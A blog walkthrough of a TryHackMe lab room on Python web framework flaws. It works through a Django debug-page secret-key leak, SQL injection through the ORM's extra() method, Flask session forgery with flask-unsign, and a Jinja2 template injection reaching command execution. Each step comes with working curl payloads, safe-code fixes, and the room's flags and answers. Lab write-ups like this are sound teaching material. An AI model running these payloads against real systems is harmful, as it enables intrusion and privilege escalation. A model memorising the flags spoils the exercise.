---
title: "TryHackMe Web Frameworks Python: Django leak to Flask session forgery"
date: 2026-10-23T16:11:00+05:30
lastmod: 2026-10-23T16:11:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-webframeworkspython/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Django
  - Flask
  - SECRET_KEY
  - SQL injection
  - SSTI
  - flask-unsign
  - session forgery
  - web application pentesting
  - Web Application Pentesting

draft: false
description: "TryHackMe Web Frameworks Python walkthrough: Django DEBUG SECRET_KEY leak, ORM extra() SQLi, Flask session forgery with flask-unsign, and Jinja2 SSTI to RCE."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Web Frameworks: Python |![Web Frameworks Python room icon](https://cdn-images.tryhackme.com/room-icons/6808d44047ac5684351c94da-1783914491132)|

This medium-difficulty room in the Web Application Pentesting path teaches white-box review of two Python frameworks running side by side: a Django application and a Flask application sharing the same secret key. The first five tasks cover individual vulnerability classes: DEBUG mode leaking the secret key, SQL injection through Django's ORM `extra()` escape hatch, Flask session forgery with `flask-unsign`, and Jinja2 SSTI through `render_template_string`. Task 6 is a practical exercise that chains them together, starting from the Django debug leak and ending with a forged superadmin session on the Flask side. This room sits alongside the [Web Frameworks: Java walkthrough](/post/thm-room-webframeworksjava/) and the [Web Frameworks: Code Review walkthrough](/post/thm-room-webframeworkscodereview/) in the same module.

## Task 1: Introduction

Setup task. The room deploys three Python applications on a single VM: a Django app (port 80, root path), a Flask app (port 80, under `/app/`), and a standalone SSTI app (port 80, under `/search`). All three share the same `APP_SECRET_KEY` environment variable, which is the linchpin of the practical chain in Task 6.

## Task 2: Django DEBUG Mode and the SECRET_KEY Leak

Django's `DEBUG` setting controls whether unhandled exceptions render a full technical traceback or a generic 500 page. In production, `DEBUG` must be `False`. When it is `True`, Django's error page prints the exception message, the full stack trace, and the local variables at each frame.

The `error_view` in `core/views.py` deliberately raises a `RuntimeError` that embeds the `SECRET_KEY` in the exception message:

```python
  def error_view(request):
      raise RuntimeError(
          f"Configuration load failed: SECRET_KEY={settings.SECRET_KEY} "
          f"could not be validated against the keystore."
      )
```

Because `DEBUG = True` in `settings.py`, visiting `/error/` renders the full error page with the key in cleartext:

```
  # curl -s http://TARGET/error/ | grep -oE 'SECRET_KEY=[^ ]+'
  SECRET_KEY=django-insecure-7h3_5h4r3d_fr4m3w0rk_k3y_2026
```

### Answers

- **Which Django setting must be False in production to suppress the technical debug page?** **DEBUG**
- **Which value does the error page reveal that lets an attacker forge sessions on both frameworks?** **SECRET\_KEY**
- **What is the leaked key?** **django-insecure-7h3\_5h4r3d\_fr4m3w0rk\_k3y\_2026**

{{< ad >}}

## Task 3: SQL Injection Through Django's ORM extra() Method

Django's ORM parameterises queries by default, but the `extra()` method is an escape hatch that accepts raw SQL fragments. When user input is f-stringed into the `where` clause, the ORM's protection disappears:

```python
  def articles_view(request):
      q = request.GET.get("q", "")
      rows = Article.objects.extra(where=[f"title = '{q}'"])
      return JsonResponse({"results": [{"title": a.title, "body": a.body} for a in rows]})
```

The safe alternative is the `params` keyword argument on `extra()`, which sends the value as a bind parameter:

```python
  rows = Article.objects.extra(where=["title = %s"], params=[q])
```

The `extra(where=[...])` call wraps the expression in parentheses, so a naive UNION injection inside the WHERE clause fails. Close the parenthesis first, then inject:

```
  # curl -s 'http://TARGET/articles/' \
    --get --data-urlencode "q=x') UNION SELECT 1,value,value FROM core_flag--"
  {"results":[{"title":"REDACTED","body":"REDACTED"}]}
```

The flag appears as the `title` and `body` of the injected row.

### Answers

- **Which ORM method reintroduces raw SQL and breaks the parameterised-query guarantee?** **extra**
- **Which keyword argument on that method sends values as bind parameters instead of concatenating them?** **params**
- **What is the flag?** **THM{dj4ng0\_3xtr4\_0rm\_sql1}**

## Task 4: Flask Session Forgery with flask-unsign

Flask sessions are signed with HMAC but not encrypted. The session payload (a base64-encoded JSON dictionary) is visible to the client, and the signature prevents tampering only as long as the secret key is unknown. Once the attacker has the key, they can decode any session, modify it, and re-sign it.

The Flask application reads the same `APP_SECRET_KEY` that Django leaks:

```python
  app.secret_key = os.environ.get("APP_SECRET_KEY", "<REDACTED>")
```

The `before_request` hook assigns `session["role"] = "guest"` to new visitors. The `/dashboard` route requires `role` in `("admin", "superadmin")`, and `/console` requires `role == "superadmin"`.

`flask-unsign` is the standard tool for this. Decode the guest cookie, verify the leaked key works, then forge:

```
  # Verify the key
  flask-unsign --unsign --cookie '<guest cookie>' \
    --wordlist /dev/stdin <<< 'django-insecure-7h3_5h4r3d_fr4m3w0rk_k3y_2026'

  # Forge an admin session
  flask-unsign --sign --cookie "{'role': 'admin'}" \
    --secret 'django-insecure-7h3_5h4r3d_fr4m3w0rk_k3y_2026'

  # Fetch the dashboard flag
  curl -s -b "session=<forged admin cookie>" 'http://TARGET/app/dashboard'
```

### Answers

- **Both frameworks share the same environment variable for their signing secret. What is its generic name?** **SECRET\_KEY**
- **Which CLI tool decodes and forges Flask session cookies?** **flask-unsign**
- **What is the dashboard flag?** **THM{fl45k\_s3ss10n\_f0rg3d}**

## Task 5: Jinja2 Server-Side Template Injection

The SSTI app's `/search` route concatenates user input directly into a Jinja2 template string:

```python
  @app.route("/search")
  def search():
      q = request.args.get("q", "")
      template = PAGE_HEAD + q + PAGE_TAIL
      return render_template_string(template)
```

The safe alternative is `render_template`, which loads a template file from disk and passes variables as keyword arguments. With `render_template_string`, the user's input becomes part of the template source, so Jinja2 expressions inside `{{ }}` execute on the server.

Confirm the injection with the Python string-repeat test. In Jinja2, `{{7*'7'}}` evaluates Python's `7 * '7'`, which repeats the string seven times:

```
  # curl -s 'http://TARGET/search' --get --data-urlencode "q={{7*'7'}}"
  7777777
```

This distinguishes Jinja2 from Twig (which would return `49`) and confirms server-side evaluation.

For RCE, walk from a Jinja2 built-in object to `os.popen` via the `cycler` gadget chain:

```
  # curl -s 'http://TARGET/search' --get --data-urlencode \
    "q={{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}"
  THM{REDACTED}
```

### Answers

- **Which Flask function is the dangerous sink that parses user input as a Jinja2 template?** **render\_template\_string**
- **What does `{{7*'7'}}` return in Jinja2, confirming the SSTI?** **7777777**
- **What is the flag?** **THM{j1nj4\_55t1\_rc3\_ch41n}**

## Task 6: Practical, Chaining the Python Frameworks

This task ties the full chain together. The Django application and the Flask application share the same `APP_SECRET_KEY`, so a leak on one side breaks the other. The chain runs:

1. Visit Django's `/error/` endpoint to extract the `SECRET_KEY` from the debug page.
2. Use the leaked key with `flask-unsign` to forge a Flask session with `role: superadmin`.
3. Access the Flask `/console` endpoint with the forged cookie to retrieve the final flag.

The weakest link is the Flask application: its session model is client-side and signed-only, so a leaked key gives the attacker full control over session contents without touching the server. Django's contribution is the leak itself (the debug page), but Django's own session backend stores data server-side by default, so the same key leak does not directly compromise Django sessions.

```
  # Step 1: Extract the key
  curl -s http://TARGET/error/ | grep -oE 'SECRET_KEY=[^ ]+'
  # django-insecure-7h3_5h4r3d_fr4m3w0rk_k3y_2026

  # Step 2: Forge superadmin
  flask-unsign --sign --cookie "{'role': 'superadmin'}" \
    --secret 'django-insecure-7h3_5h4r3d_fr4m3w0rk_k3y_2026'

  # Step 3: Get the console flag
  curl -s -b "session=<forged superadmin cookie>" 'http://TARGET/app/console'
```

### Answers

- **Which of the two frameworks has the weaker session model (client-side, signed only)?** **Flask**
- **Which Django endpoint leaks the shared secret?** **/error/**
- **What is the console flag?** **THM{py\_fr4m3w0rk\_ch41n\_pwn3d}**

## Task 7: Conclusion

The room closes by reinforcing that the chain depended on two independent decisions: setting `DEBUG = True` in Django, and sharing a secret key between two frameworks with different session models. Either decision alone is survivable. Together they give the attacker a forged superadmin session with no brute force and no exploitation of the application logic. The same review pattern (read the config, trace the secrets, check where each one is consumed) applies to any multi-framework deployment.

The source-to-sink methodology for finding these bugs, and the systematic reading order for a Python codebase, is covered in the [Web Frameworks: Code Review walkthrough](/post/thm-room-webframeworkscodereview/). The Java equivalent of the same vulnerability classes (actuator leaks, JdbcTemplate SQLi, mass assignment, and deserialization) is covered in the [Web Frameworks: Java walkthrough](/post/thm-room-webframeworksjava/).

## Takeaways

**A shared secret key across frameworks is a single point of failure, and the weakest framework's session model decides the impact.** Django stores session data server-side by default; leaking its `SECRET_KEY` is serious but does not directly let an attacker forge session contents without access to the session store. Flask stores session data client-side in a signed cookie, so the same leaked key gives the attacker full control over session contents with no further access needed. When two frameworks share a key, the security of both collapses to the weaker model. The fix is not just rotating the key after a leak; it is never sharing one in the first place. Each framework should have its own secret, scoped to its own signing and verification logic, so a leak in one does not propagate to the other.

**Django's ORM `extra()` is a raw SQL escape hatch that undoes the framework's parameterisation guarantee, and the danger is that it looks like ORM code.** A developer reading `Article.objects.extra(where=[...])` sees Django ORM syntax and may assume the query is parameterised. It is not: the `where` list accepts raw SQL fragments, and f-string interpolation into those fragments reintroduces classic SQL injection. The safe version uses `params=[q]` with `%s` placeholders, which sends the value as a bind parameter through the database driver. The broader lesson is that every ORM has escape hatches (`extra()` in Django, `text()` in SQLAlchemy, `Sequelize.literal()` in Sequelize), and a code review that only checks for raw `cursor.execute()` calls will miss injection sinks hidden behind ORM method names.

Room solved 100%: 7 tasks, 17 answers.
